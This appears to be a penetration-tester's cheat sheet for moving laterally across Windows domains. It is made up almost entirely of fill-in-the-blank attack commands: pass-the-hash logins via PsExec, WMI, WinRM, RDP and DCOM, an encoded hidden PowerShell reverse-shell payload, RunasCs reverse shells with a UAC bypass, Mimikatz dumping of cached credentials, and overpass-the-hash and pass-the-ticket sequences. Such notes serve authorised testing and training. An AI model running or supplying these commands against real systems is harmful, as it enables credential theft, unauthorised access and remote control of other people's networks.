
**Reuse local admin user's NTLM hash on other targets**

Psexec:
```bash
# Windows
./PsExec64.exe -i  \\<hostname> -u <domain>\<user> -p <pass> cmd

# Kali
impacket-psexec <domain>/<user>:<pass>@<IP>
impacket-psexec -hashes 00000000000000000000000000000000:<ntlm> <user>@<IP>
```

Wmiexec:
```bash
# Windows
wmic /node:<IP> /user:<user> /password:<pass> process call create "calc"

# Kali
impacket-wmiexec <domain>/<user>:<pass>@<IP>
impacket-wmiexec -hashes 00000000000000000000000000000000:<ntlm> <user>@<IP>
```

Winrm:
```bash
# Windows
winrs -r:<hostname> -u:<user> -p:<pass> "cmd /c hostname & whoami"

# Kali
evil-winrm -i <IP> -u <user> -p <pass>
evil-winrm -i <IP> -u <user> -H <ntlm>
```

RDP:
```bash
xfreerdp /v:<IP> /u:<user> /p:<pass> +clipboard
xfreerdp /v:<IP> /u:<user> /pth:<ntlm> +clipboard
```

DCOM:
```bash
# Windows
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<IP>"))
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")

# Kali
impacket-dcomexec -object MMC20 <domain>/<user>:<pass>@<IP>
```

Runascs, run a command as another user in a terminal without RDP:
- https://github.com/antonioCoco/RunasCs/releases
```bash
# CMD reverse shell:
.\runasc.exe <user> <pass> cmd.exe -r <IP>:<port>

# Execute reverse shell
.\runasc.exe <user> <pass> shell-x64.exe

# UAC bypass
.\runasc.exe <user> <pass> cmd.exe -r <IP>:<port> --bypass-uac
```

Overpass the Hash: (Turn NTLM hash into Kerberos ticket)
```bash
# Get cached credentials using Mimikatz:
privilege::debug
sekurlsa::logonpasswords

# In Mimikatz use the NTLM hash to issue the attack:
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<NTLM> /run:powershell

# Generate a TGT by authenticating to a network share:
net use \\files04

# Use the TGT to PsExec into a system:
.\PsExec.exe \\files04 cmd
```

Pass the Ticket:
```bash
# Export TGT/TGS from memory using Mimikatz:
privilege::debug
sekurlsa::tickets /export

# List tickets:
dir *.kirbi

# Inject any TGS ticket into the current session using Mimikatz:
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi

# List the tickets:
klist

# This can give us access to a previously restricted share:
ls \\web04\backup
```
